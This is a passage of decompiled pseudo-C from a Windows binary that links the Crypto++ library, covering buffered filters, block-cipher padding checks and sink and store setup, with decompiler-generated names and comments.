// 41DD5E: using guessed type _DWORD pExceptionObject[10];

//----- (0041DDBC) --------------------------------------------------------
int __thiscall sub_41DDBC(_DWORD *this, int a2)
{
  int result; // eax
  int v4; // [esp+10h] [ebp-58h] BYREF
  int v5; // [esp+14h] [ebp-54h]
  int pExceptionObject[10]; // [esp+18h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+40h] [ebp-28h] BYREF

  v4 = 0;
  v5 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int, const char *, void *, int *))(*(_DWORD *)a2 + 4))(
          a2,
          "OutputBuffer",
          &CryptoPP::ByteArrayParameter `RTTI Type Descriptor',
          &v4) )
  {
    sub_40AAE3((int)Src, "ArraySink: missing OutputBuffer argument");
    Src[9] = 0;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  this[3] = v4;
  result = v5;
  this[4] = v5;
  return result;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (0041DE34) --------------------------------------------------------
int __thiscall sub_41DE34(int *this, int a2)
{
  _DWORD *v3; // ebx
  int *v4; // esi
  int result; // eax
  int pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+38h] [ebp-28h] BYREF

  v3 = this + 8;
  v4 = this + 6;
  (*(void (__thiscall **)(int *, int, int *, int *, int *))(*this + 204))(this, a2, this + 6, this + 7, this + 8);
  if ( *v4 == -1 || !this[7] || *v3 == -1 )
  {
    sub_40AAE3((int)Src, "FilterWithBufferedInput: invalid buffer size");
    Src[9] = 0;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  result = sub_41EB28(this + 10, 1, *v4);
  *((_BYTE *)this + 36) = 0;
  return result;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (0041DEB9) --------------------------------------------------------
int __thiscall sub_41DEB9(int this, void *a2)
{
  void *v2; // esi
  int result; // eax
  int v5; // ecx

  v2 = a2;
  *(_BYTE *)(this + 48) = sub_41D2E4(a2, (int)"PutMessage", 0);
  result = (*(int (__thiscall **)(void *, const char *, int *, void **))(*(_DWORD *)v2 + 4))(
             v2,
             "TruncatedDigestSize",
             &int `RTTI Type Descriptor',
             &a2);
  v5 = -1;
  if ( (_BYTE)result )
    v5 = (int)a2;
  if ( v5 < 0 )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 44) + 28))(*(_DWORD *)(this + 44));
    v5 = result;
  }
  *(_DWORD *)(this + 52) = v5;
  return result;
}
// 49074C: using guessed type int int `RTTI Type Descriptor';

//----- (0041DF09) --------------------------------------------------------
int __cdecl sub_41DF09(int *a1, unsigned int a2)
{
  bool v2; // zf
  int v3; // eax

  v2 = (*(int (__thiscall **)(int *))(*a1 + 36))(a1) == 0;
  v3 = *a1;
  if ( !v2 )
    return (*(int (__thiscall **)(int *))(v3 + 36))(a1);
  if ( (unsigned int)(*(int (__thiscall **)(int *))(v3 + 12))(a1) <= 1
    || (*(unsigned __int8 (__thiscall **)(int *))(*a1 + 56))(a1)
    || a2 < 2 )
  {
    return 0;
  }
  return (*(int (__thiscall **)(int *))(*a1 + 12))(a1);
}

//----- (0041DF4E) --------------------------------------------------------
int __fastcall sub_41DF4E(int *a1, int a2, void *a3, size_t Size)
{
  bool v5; // zf
  size_t v6; // ebx
  int v7; // eax
  int v8; // eax
  int v9; // eax
  size_t v10; // ebx
  int v11; // eax
  char *v12; // edx
  void *v13; // ebx
  int v14; // eax
  size_t v15; // esi
  int v16; // eax
  int result; // eax
  int v18; // eax
  void *v19; // eax
  int v20; // ecx
  char *v21; // eax
  _BYTE *v22; // esi
  unsigned int v23; // eax
  _BYTE *v24; // edx
  unsigned __int8 v25; // cl
  unsigned int v26; // ebx
  char *v27; // eax
  unsigned __int8 v28; // cl
  int v29; // eax
  int v30; // eax
  int v31; // ecx
  char v32; // cl
  size_t v33; // esi
  int v34; // eax
  int v35; // eax
  char *v36; // ecx
  int v37; // eax
  int v38; // edi
  int v39; // esi
  int v40; // eax
  char *v41; // [esp-8h] [ebp-34h]
  void *v42; // [esp-4h] [ebp-30h]
  size_t v43; // [esp-4h] [ebp-30h]
  _ThrowInfo *v44; // [esp-4h] [ebp-30h]
  size_t v45; // [esp-4h] [ebp-30h]
  unsigned __int8 v46; // [esp+13h] [ebp-19h] BYREF
  void *Src; // [esp+14h] [ebp-18h] BYREF
  void *v48; // [esp+18h] [ebp-14h] BYREF
  char *v49; // [esp+1Ch] [ebp-10h] BYREF
  int v50; // [esp+28h] [ebp-4h]
  int v51[10]; // [esp+2Ch] [ebp+0h] BYREF
  _DWORD v52[6]; // [esp+54h] [ebp+28h] BYREF
  int pExceptionObject[10]; // [esp+6Ch] [ebp+40h] BYREF
  _DWORD v54[6]; // [esp+94h] [ebp+68h] BYREF

  v48 = a1;
  v5 = *((_BYTE *)a1 + 116) == 0;
  v6 = Size;
  Src = a3;
  if ( !v5 )
  {
    v49 = (char *)a1[28];
    v7 = *a1;
    v48 = (void *)(Size % a1[26]);
    v8 = (*(int (**)(void))(v7 + 164))();
    v9 = sub_41DB59(a1 + 18, v8, (int)dword_48C0AC, (size_t)v49, (size_t)v49, (size_t *)&v49);
    v49 = (char *)v9;
    v10 = Size - (_DWORD)v48;
    if ( Size == (_DWORD)v48 )
    {
      v12 = (char *)Src;
    }
    else
    {
      (*(void (__thiscall **)(int, int, void *, size_t))(*(_DWORD *)a1[24] + 28))(a1[24], v9, Src, v10);
      v11 = (*(int (__thiscall **)(int *))(*a1 + 164))(a1);
      (*(void (__thiscall **)(int, char *, size_t, _DWORD, int))(*(_DWORD *)v11 + 20))(v11, v49, v10, 0, 1);
      v12 = (char *)Src + v10;
    }
    if ( v48 )
    {
      v42 = v48;
      v41 = v12;
    }
    else
    {
      v42 = 0;
      v41 = 0;
    }
    v13 = v49;
    v14 = (*(int (__stdcall **)(char *, int, char *, void *))(*(_DWORD *)a1[24] + 32))(v49, a1[28], v41, v42);
LABEL_8:
    v15 = v14;
    v16 = (*(int (__thiscall **)(int *))(*a1 + 164))(a1);
    return (*(int (__thiscall **)(int, void *, size_t, _DWORD, int))(*(_DWORD *)v16 + 20))(v16, v13, v15, 0, 1);
  }
  result = a1[25];
  if ( result >= 0 )
  {
    if ( result <= 1 )
    {
      if ( Size )
      {
        v30 = (*(int (__thiscall **)(int))(*(_DWORD *)a1[24] + 36))(a1[24]);
        v31 = a1[24];
        v49 = (char *)v30;
        v32 = (*(int (__thiscall **)(int))(*(_DWORD *)v31 + 56))(v31);
        if ( v32 && a1[25] == 1 && (!v49 || Size < (unsigned int)v49) )
        {
          v33 = (size_t)v49;
          v34 = *a1;
          if ( (unsigned int)v49 < a1[26] )
            v33 = a1[26];
          v49 = (char *)v33;
          v35 = (*(int (__fastcall **)(int *))(v34 + 164))(a1);
          v36 = (char *)sub_41DB59(a1 + 18, v35, (int)dword_48C0AC, v33, v33, (size_t *)&v49);
          v49 = v36;
          if ( Src )
          {
            memmove_0(v36, Src, Size);
            v36 = v49;
          }
          memset(&v36[Size], 0, v33 - Size);
          v13 = v49;
          v14 = (*(int (__stdcall **)(char *, size_t, char *, size_t))(*(_DWORD *)a1[24] + 32))(v49, v33, v49, v33);
          goto LABEL_8;
        }
        if ( !v49 )
        {
          if ( v32 )
          {
            sub_40AAE3(
              (int)v54,
              "StreamTransformationFilter: plaintext length is not a multiple of block size and NO_PADDING is specified");
            v50 = 0;
            sub_406307(pExceptionObject, 4, v54);
            pExceptionObject[0] = (int)&CryptoPP::InvalidDataFormat::`vftable';
            v44 = (_ThrowInfo *)&_TI3_AVInvalidDataFormat_CryptoPP__;
LABEL_28:
            _CxxThrowException(pExceptionObject, v44);
          }
          sub_40AAE3((int)v54, "StreamTransformationFilter: ciphertext length is not a multiple of block size");
          v50 = 1;
          goto LABEL_26;
        }
        v49 = (char *)a1[27];
        v37 = (*(int (__thiscall **)(int *))(*a1 + 164))(a1);
        v38 = sub_41DB59(a1 + 18, v37, (int)dword_48C0AC, Size, Size, (size_t *)&v49);
        v39 = (*(int (__thiscall **)(_DWORD, int, size_t, void *, size_t))(**((_DWORD **)v48 + 24) + 32))(
                *((_DWORD *)v48 + 24),
                v38,
                Size,
                Src,
                Size);
        v40 = (*(int (__thiscall **)(void *))(*(_DWORD *)v48 + 164))(v48);
        return (*(int (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)v40 + 20))(v40, v38, v39, 0, 1);
      }
    }
    else if ( result <= 4 )
    {
      v49 = (char *)a1[26];
      v48 = (void *)a1[27];
      v18 = (*(int (__thiscall **)(int *))(*a1 + 164))(a1);
      v15 = (size_t)v49;
      v19 = (void *)sub_41DB59(a1 + 18, v18, (int)dword_48C0AC, (size_t)v49, (size_t)v49, (size_t *)&v48);
      v20 = a1[24];
      v48 = v19;
      if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v20 + 56))(v20) )
      {
        if ( Src )
          memmove_0(v48, Src, Size);
        if ( a1[25] == 2 )
        {
          memset((char *)v48 + Size, (unsigned __int8)((_BYTE)v49 - Size), (size_t)&v49[-Size]);
          v15 = (size_t)v49;
        }
        else
        {
          v43 = v15 - Size - 1;
          if ( a1[25] == 4 )
          {
            memset((char *)v48 + Size, 0, v43);
            v15 = (size_t)v49;
            v13 = v48;
            *((_BYTE *)v48 + (_DWORD)v49 - 1) = (_BYTE)v49 - Size;
LABEL_23:
            (*(void (__thiscall **)(int, void *, void *, size_t))(*(_DWORD *)a1[24] + 28))(a1[24], v13, v13, v15);
            v16 = (*(int (__thiscall **)(int *))(*a1 + 164))(a1);
            return (*(int (__thiscall **)(int, void *, size_t, _DWORD, int))(*(_DWORD *)v16 + 20))(v16, v13, v15, 0, 1);
          }
          v21 = (char *)v48 + 1;
          *((_BYTE *)v48 + Size) = 0x80;
          memset(&v21[Size], 0, v43);
        }
        v13 = v48;
        goto LABEL_23;
      }
      if ( Size != v15 )
      {
        sub_40AAE3((int)v54, "StreamTransformationFilter: ciphertext length is not a multiple of block size");
        v50 = 2;
LABEL_26:
        sub_406307(pExceptionObject, 4, v54);
LABEL_27:
        pExceptionObject[0] = (int)&CryptoPP::InvalidCiphertext::`vftable';
        v44 = (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__;
        goto LABEL_28;
      }
      v45 = v15;
      v22 = v48;
      (*(void (__thiscall **)(int, void *, void *, size_t))(*(_DWORD *)a1[24] + 28))(a1[24], v48, Src, v45);
      if ( a1[25] == 2 )
      {
        v23 = (unsigned int)v49;
        v24 = &v22[(_DWORD)v49];
        v25 = v22[(_DWORD)v49 - 1];
        v49 = &v22[(_DWORD)v49];
        v46 = v25;
        if ( !v25
          || v25 > v23
          || (v26 = v23 - v25, Src = &v46, v27 = sub_41D36F(&v22[v26], v24, (_BYTE **)&Src), v27 != v49) )
        {
          sub_40AAE3((int)v54, "StreamTransformationFilter: invalid PKCS #7 block padding found");
          v50 = 3;
          goto LABEL_26;
        }
      }
      else if ( a1[25] == 4 )
      {
        v28 = v22[(_DWORD)v49 - 1];
        if ( !v28 || v28 > (unsigned int)v49 )
        {
          sub_40AAE3((int)v54, "StreamTransformationFilter: invalid W3C block padding found");
          v50 = 4;
          sub_406307(pExceptionObject, 4, v54);
          goto LABEL_27;
        }
        v26 = (unsigned int)&v49[-v28];
      }
      else
      {
        while ( v6 > 1 && !v22[v6 - 1] )
          --v6;
        v26 = v6 - 1;
        if ( v22[v26] != 0x80 )
        {
          sub_40AAE3((int)v52, "StreamTransformationFilter: invalid ones-and-zeros padding found");
          v50 = 5;
          sub_406307(v51, 4, v52);
          v51[0] = (int)&CryptoPP::InvalidCiphertext::`vftable';
          _CxxThrowException(v51, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
        }
      }
      v29 = (*(int (__thiscall **)(int *))(*a1 + 164))(a1);
      return (*(int (__thiscall **)(int, _BYTE *, unsigned int, _DWORD, int))(*(_DWORD *)v29 + 20))(v29, v22, v26, 0, 1);
    }
  }
  return result;
}
// 46C434: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';
// 46C440: using guessed type void *CryptoPP::InvalidCiphertext::`vftable';
// 487DC0: using guessed type __TI_flags _TI3_AVInvalidDataFormat_CryptoPP__;
// 48C0AC: using guessed type _DWORD dword_48C0AC[6];
// 41DF4E: using guessed type _DWORD var_1C[6];
// 41DF4E: using guessed type _DWORD var_5C[6];

//----- (0041E3B8) --------------------------------------------------------
bool __thiscall sub_41E3B8(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  v4 = this[5];
  if ( v4 )
  {
    if ( v4 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int))(*this + 36))(this, a3) )
  {
    return 1;
  }
  return (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 184))(this)
      && sub_41E642(this, 1, a2, a3, (int)dword_48C0AC);
}
// 48C0AC: using guessed type _DWORD dword_48C0AC[6];

//----- (0041E407) --------------------------------------------------------
_DWORD *__thiscall sub_41E407(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = this;
  if ( a2 )
    return sub_41D38F(a2, (int)this);
  return result;
}

//----- (0041E431) --------------------------------------------------------
_DWORD *sub_41E431()
{
  _DWORD *v0; // ecx
  _DWORD *result; // eax

  v0 = operator new(0x60u);
  result = 0;
  if ( v0 )
    return sub_4272CD(v0, (_DWORD *)0x100);
  return result;
}

//----- (0041E463) --------------------------------------------------------
int __stdcall sub_41E463(int a1, int a2)
{
  return 0;
}

//----- (0041E468) --------------------------------------------------------
int __thiscall sub_41E468(int *this, int a2, int a3, char a4)
{
  int v4; // eax

  v4 = *this;
  if ( a4 )
    return (*(int (__stdcall **)(int, int))(v4 + 224))(a2, a3);
  else
    return (*(int (__stdcall **)(int, int))(v4 + 220))(a2, a3);
}

//----- (0041E48B) --------------------------------------------------------
int __thiscall sub_41E48B(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 220))(this);
}

//----- (0041E493) --------------------------------------------------------
int __thiscall sub_41E493(_DWORD **this, int a2, int a3)
{
  int v4; // eax

  (*(void (__thiscall **)(_DWORD *, int, int, int))(*this[24] + 28))(this[24], a2, a2, a3);
  v4 = ((int (__thiscall *)(_DWORD **))(*this)[41])(this);
  return (*(int (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)v4 + 24))(v4, a2, a3, 0, 1);
}

//----- (0041E4CA) --------------------------------------------------------
int __thiscall sub_41E4CA(_DWORD *this, int a2, int a3)
{
  int i; // esi
  int result; // eax

  for ( i = a3; i; i -= this[7] )
  {
    result = (*(int (__thiscall **)(_DWORD *, int))(*this + 216))(this, a2);
    a2 += this[7];
  }
  return result;
}

//----- (0041E4F4) --------------------------------------------------------
void __userpurge sub_41E4F4(
        int *a1@<ecx>,
        size_t *a2@<ebx>,
        size_t a3@<ebp>,
        int a4,
        unsigned int a5,
        size_t a6,
        unsigned int a7)
{
  unsigned int v7; // edi
  int v9; // ebp
  _DWORD *v10; // ebx
  int v11; // eax
  int v12; // eax
  void *v13; // eax
  unsigned int v14; // ebx
  int v15; // ebx
  int v16; // eax
  void *retaddr; // [esp+18h] [ebp+0h]

  v7 = a5;
  if ( a5 )
  {
    v9 = (*(int (__thiscall **)(int))(*(_DWORD *)a1[24] + 12))(a1[24]);
    v10 = a1 + 18;
    do
    {
      v11 = *a1;
      a5 = a1[27];
      v12 = (*(int (__thiscall **)(int *, _DWORD *, int))(v11 + 164))(a1, dword_48C0AC, v9);
      v13 = (void *)sub_41DB59(v10, v12, v7, (size_t)&a5, a3, a2);
      v14 = a7;
      retaddr = v13;
      if ( a7 >= v7 )
      {
        v15 = v7;
      }
      else
      {
        if ( a7 == a1[27] )
          a7 = v14 - (*(int (__thiscall **)(int))(*(_DWORD *)a1[24] + 20))(a1[24]);
        v15 = sub_40A9DA(&a7, &a4);
      }
      a2 = (size_t *)v15;
      a3 = a6;
      (*(void (__thiscall **)(int, void *))(*(_DWORD *)a1[24] + 28))(a1[24], retaddr);
      v16 = (*(int (__thiscall **)(int *))(*a1 + 164))(a1);
      (*(void (__thiscall **)(int))(*(_DWORD *)v16 + 24))(v16);
      a4 += v15;
      v7 -= v15;
      v10 = a1 + 18;
    }
    while ( v7 );
  }
}
// 41E4F4: could not find valid save-restore pair for ebx
// 41E4F4: could not find valid save-restore pair for ebp
// 48C0AC: using guessed type _DWORD dword_48C0AC[6];

//----- (0041E5B7) --------------------------------------------------------
int __thiscall sub_41E5B7(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // edi
  int v9; // esi
  int result; // eax
  int v11; // ecx

  v8 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *))(*this + 164))(this);
  v9 = a5 - 1;
  if ( !a5 )
    v9 = 0;
  result = (*(int (__stdcall **)(int, int, int, int, int))(v8 + 136))(a7, a3, a4, v9, a6);
  v11 = 0;
  if ( result )
    v11 = a2;
  this[5] = v11;
  return result;
}

//----- (0041E5FB) --------------------------------------------------------
char __thiscall sub_41E5FB(_DWORD *this, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // eax

  if ( a4
    && (v7 = (*(int (__thiscall **)(_DWORD *))(*this + 164))(this),
        (*(unsigned __int8 (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v7 + 144))(v7, a6, a3, a4 - 1, a5)) )
  {
    this[5] = a2;
    return 1;
  }
  else
  {
    this[5] = 0;
    return 0;
  }
}

//----- (0041E642) --------------------------------------------------------
char __thiscall sub_41E642(_DWORD *this, int a2, int a3, int a4, int a5)
{
  int v6; // eax

  if ( a3
    && (v6 = (*(int (__thiscall **)(_DWORD *))(*this + 164))(this),
        (*(unsigned __int8 (__thiscall **)(int, int, int, int))(*(_DWORD *)v6 + 148))(v6, a5, a3 - 1, a4)) )
  {
    this[5] = a2;
    return 1;
  }
  else
  {
    this[5] = 0;
    return 0;
  }
}

//----- (0041E686) --------------------------------------------------------
void __thiscall sub_41E686(void *this, int a2, int a3)
{
  int v3; // eax

  if ( a3 )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 40))(v3, a2, a3 - 1);
  }
}

//----- (0041E6AA) --------------------------------------------------------
unsigned int __thiscall sub_41E6AA(_DWORD *this, void *Src, unsigned int a3, int a4, int a5)
{
  size_t v6; // ebp
  _DWORD *v7; // esi
  unsigned int v8; // eax

  v6 = 0;
  if ( this[3] && Src )
  {
    v7 = this + 6;
    v8 = sub_40C058(this + 4, this + 6);
    v6 = a3;
    if ( v8 < a3 )
      v6 = v8;
    memmove((void *)(this[3] + *v7), Src, v6);
  }
  *((_QWORD *)this + 3) += v6;
  return a3 - v6;
}

//----- (0041E6FA) --------------------------------------------------------
unsigned int __thiscall sub_41E6FA(_DWORD *this, unsigned int a2, unsigned int a3, int a4, int a5)
{
  unsigned int v6; // ebp
  _DWORD *v7; // esi
  unsigned int v8; // eax

  v6 = 0;
  if ( this[3] && a2 )
  {
    v7 = this + 6;
    v8 = sub_40C058(this + 4, this + 6);
    v6 = a3;
    if ( v8 < a3 )
      v6 = v8;
    sub_420D68(this[3] + *v7, a2, v6);
  }
  *((_QWORD *)this + 3) += v6;
  return a3 - v6;
}

//----- (0041E74A) --------------------------------------------------------
int __thiscall sub_41E74A(int *this, char *Src, int a3, int a4, int a5)
{
  return sub_41E89F(this, Src, a3, a4, a5, 0);
}

//----- (0041E764) --------------------------------------------------------
int __thiscall sub_41E764(int this, int a2, int a3, int a4, int a5)
{
  int v5; // ebx
  int v7; // edi
  int v8; // eax
  int v9; // eax
  unsigned int v11; // ebx
  int v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // [esp-8h] [ebp-14h]
  size_t v16; // [esp+0h] [ebp-Ch]
  size_t *v17; // [esp+4h] [ebp-8h]
  int v18; // [esp+4h] [ebp-8h]

  v5 = a3;
  v7 = 1;
  v8 = *(_DWORD *)(this + 20);
  if ( v8 )
  {
    v9 = v8 - 1;
    if ( v9 )
    {
      if ( v9 != 1 )
        return 0;
      goto LABEL_15;
    }
    goto LABEL_6;
  }
  *(_DWORD *)(this + 16) = 0;
  if ( *(_BYTE *)(this + 48) )
  {
LABEL_6:
    if ( sub_41E5B7((_DWORD *)this, 1, a2, v5, 0, a5, this + 60) )
    {
      v11 = v5 - *(_DWORD *)(this + 16);
      if ( v11 > 1 )
        return v11;
      return v7;
    }
  }
  if ( a2 && v5 )
    (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 44) + 12))(*(_DWORD *)(this + 44), a2, v5);
  if ( !a4 )
    return 0;
  a2 = *(_DWORD *)(this + 52);
  v15 = a2;
  v12 = (*(int (__thiscall **)(int, int, int))(*(_DWORD *)this + 164))(this, this + 84, a2);
  v13 = sub_41DB59((_DWORD *)(this + 24), v12, v15, (size_t)&a2, v16, v17);
  v14 = *(_DWORD *)(this + 44);
  v18 = *(_DWORD *)(this + 52);
  *(_DWORD *)(this + 56) = v13;
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v14 + 56))(v14, v13, v18);
LABEL_15:
  if ( !sub_41E5B7((_DWORD *)this, 2, *(_DWORD *)(this + 56), *(_DWORD *)(this + 52), a4, a5, this + 84) )
    return 0;
  if ( (unsigned int)(*(_DWORD *)(this + 52) - *(_DWORD *)(this + 16)) > 1 )
    return *(_DWORD *)(this + 52) - *(_DWORD *)(this + 16);
  return v7;
}
// 41E7F6: variable 'v16' is possibly undefined
// 41E7F6: variable 'v17' is possibly undefined

//----- (0041E838) --------------------------------------------------------
void *__thiscall sub_41E838(int this, char *Src, unsigned int a3)
{
  int v4; // edx
  unsigned int v5; // ecx
  int v6; // ebx
  void *v7; // ecx
  size_t v8; // ebx
  unsigned int v9; // edx
  void *result; // eax

  if ( Src && a3 )
  {
    v4 = *(_DWORD *)(this + 8);
    v5 = *(_DWORD *)(this + 24);
    v6 = *(_DWORD *)(this + 28);
    if ( v5 >= *(_DWORD *)(this + 12) + v4 - v6 )
      v5 -= v4;
    v7 = (void *)(v6 + v5);
    v8 = a3;
    v9 = *(_DWORD *)(this + 12) + v4 - (_DWORD)v7;
    if ( v9 < a3 )
      v8 = v9;
    result = memmove_0(v7, Src, v8);
    if ( v8 < a3 )
      result = memmove_0(*(void **)(this + 12), &Src[v8], a3 - v8);
    *(_DWORD *)(this + 24) += a3;
  }
  return result;
}

//----- (0041E89F) --------------------------------------------------------
int __thiscall sub_41E89F(int *this, char *Src, int a3, int a4, int a5, char a6)
{
  char *v7; // esi
  bool v8; // zf
  int v9; // ecx
  unsigned int v10; // edi
  unsigned int v11; // eax
  int v12; // esi
  int v13; // eax
  int *v14; // edx
  unsigned int v15; // ecx
  int v16; // esi
  int v17; // eax
  int v18; // ecx
  int v19; // esi
  int v20; // eax
  int v21; // esi
  int v22; // esi
  char *v23; // eax
  int v24; // eax
  unsigned int v25; // eax
  int v26; // edi
  char *v27; // esi
  unsigned int v29; // [esp-4h] [ebp-70h]
  int v30; // [esp-4h] [ebp-70h]
  int v31; // [esp-4h] [ebp-70h]
  unsigned int v32; // [esp+10h] [ebp-5Ch] BYREF
  unsigned int v33; // [esp+14h] [ebp-58h] BYREF
  void *v34; // [esp+18h] [ebp-54h]
  _DWORD pExceptionObject[10]; // [esp+1Ch] [ebp-50h] BYREF
  _DWORD v36[2]; // [esp+44h] [ebp-28h] BYREF
  size_t v37[3]; // [esp+4Ch] [ebp-20h] BYREF
  size_t Size; // [esp+58h] [ebp-14h]
  int v39; // [esp+68h] [ebp-4h]

  v7 = Src;
  v34 = Src;
  if ( !(_BYTE)a5 )
  {
    sub_40AAE3((int)v36, "FilterWithBufferedInput");
    v39 = 0;
    sub_41D3DA(pExceptionObject, v36);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__);
  }
  if ( a3 )
  {
    v8 = *((_BYTE *)this + 36) == 0;
    v9 = this[16];
    v10 = v9 + a3;
    v33 = v9 + a3;
    if ( !v8 )
      goto LABEL_8;
    v11 = this[6];
    if ( v10 >= v11 )
    {
      v32 = v11 - v9;
      sub_41E838((int)(this + 10), Src, v11 - v9);
      v12 = *this;
      v13 = sub_41DA41(this + 10, this + 6);
      (*(void (__thiscall **)(int *, int))(v12 + 212))(this, v13);
      sub_41EB28(this + 10, this[7], (this[8] + 2 * this[7] - 2) / (unsigned int)this[7]);
      v7 = (char *)v34 + v32;
      v10 = v33 - this[6];
      v34 = (char *)v34 + v32;
      v33 = v10;
      *((_BYTE *)this + 36) = 1;
    }
    if ( *((_BYTE *)this + 36) )
    {
LABEL_8:
      v14 = this + 7;
      v15 = this[7];
      if ( v15 == 1 )
      {
        while ( v10 > this[8] && this[16] )
        {
          v33 = v10 - this[8];
          v24 = sub_41DA41(this + 10, (int *)&v33);
          (*(void (__thiscall **)(int *, int, unsigned int))(*this + 224))(this, v24, v33);
          v10 -= v33;
        }
        v25 = this[8];
        v32 = v25;
        if ( v10 > v25 )
        {
          v26 = v10 - v25;
          sub_41E468(this, (int)v7, v26, a6);
          v27 = &v7[v26];
          v10 = v32;
          v34 = v27;
        }
      }
      else
      {
        if ( v10 >= v15 + this[8] )
        {
          do
          {
            if ( this[16] < v15 )
              break;
            v16 = *this;
            v29 = v15;
            v17 = sub_41DA05(this + 10);
            (*(void (__thiscall **)(int *, int, unsigned int))(v16 + 224))(this, v17, v29);
            v14 = this + 7;
            v15 = this[7];
            v10 -= v15;
          }
          while ( v10 >= v15 + this[8] );
          v33 = v10;
        }
        v18 = *v14;
        if ( v10 >= *v14 + this[8] && this[16] )
        {
          v32 = v18 - this[16];
          sub_41E838((int)(this + 10), (char *)v34, v32);
          v30 = this[7];
          v34 = (char *)v34 + v32;
          v19 = *this;
          v20 = sub_41DA05(this + 10);
          (*(void (__thiscall **)(int *, int, int))(v19 + 224))(this, v20, v30);
          v14 = this + 7;
          v18 = this[7];
          v10 = v33 - v18;
        }
        v21 = this[8];
        if ( v10 >= v21 + v18 )
        {
          v32 = v10 - v21;
          v22 = sub_40A9DA(&v32, v14);
          sub_41E468(this, (int)v34, v22, a6);
          v23 = (char *)v34 + v22;
          v10 -= v22;
LABEL_24:
          sub_41E838((int)(this + 10), v23, v10 - this[16]);
          goto LABEL_25;
        }
      }
    }
    v23 = (char *)v34;
    goto LABEL_24;
  }
LABEL_25:
  if ( a4 )
  {
    if ( !*((_BYTE *)this + 36) && !this[6] )
      (*(void (__thiscall **)(int *, _DWORD))(*this + 212))(this, 0);
    sub_408A33(v37, this[16]);
    v39 = 1;
    sub_41D9B0((int)(this + 10), Size);
    (*(void (__thiscall **)(int *, size_t, size_t))(*this + 228))(this, Size, v37[2]);
    v31 = this[6];
    *((_BYTE *)this + 36) = 0;
    sub_41EB28(this + 10, 1, v31);
    sub_41E5B7(this, 1, 0, 0, a4, a5, (int)dword_48C0AC);
    sub_4089EF(v37);
  }
  return 0;
}
// 48C0AC: using guessed type _DWORD dword_48C0AC[6];
// 41E89F: using guessed type _DWORD var_28[2];
// 41E89F: using guessed type _DWORD pExceptionObject[10];

//----- (0041EB0E) --------------------------------------------------------
int __thiscall sub_41EB0E(int *this, char *Src, int a3, int a4, int a5)
{
  return sub_41E89F(this, Src, a3, a4, a5, 1);
}

//----- (0041EB28) --------------------------------------------------------
int __thiscall sub_41EB28(_DWORD *this, int a2, int a3)
{
  int result; // eax

  sub_40898B((int)this, a3 * a2);
  result = this[3];
  this[6] = 0;
  this[4] = a2;
  this[5] = a3;
  this[7] = result;
  return result;
}

//----- (0041EB56) --------------------------------------------------------
void __thiscall sub_41EB56(_DWORD *this, int *a2)
{
  int v3; // eax
  bool v4; // zf
  int v5; // eax
  int v6; // eax
  int v7[3]; // [esp+10h] [ebp-6Ch] BYREF
  _DWORD v8[4]; // [esp+1Ch] [ebp-60h] BYREF
  int pExceptionObject[10]; // [esp+2Ch] [ebp-50h] BYREF
  _DWORD Src[9]; // [esp+54h] [ebp-28h] BYREF
  int v11; // [esp+78h] [ebp-4h]

  sub_406A26(v7, 0, 0);
  v3 = *a2;
  v11 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int *, const char *, void *, int *))(v3 + 4))(
          a2,
          "InputBuffer",
          &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
          v7) )
  {
    sub_40AAE3((int)Src, "StringStore: missing InputBuffer argument");
    LOBYTE(v11) = 1;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v4 = LOBYTE(v7[0]) == 0;
  v5 = v7[1];
  if ( LOBYTE(v7[0]) )
    v5 = v8[3];
  this[5] = v5;
  v6 = v7[2];
  if ( !v4 )
    v6 = v8[2];
  this[6] = v6;
  this[7] = 0;
  sub_4089EF(v8);
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 41EB56: using guessed type _DWORD Src[9];

//----- (0041EBEF) --------------------------------------------------------
int __thiscall sub_41EBEF(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 124))(v1);
}

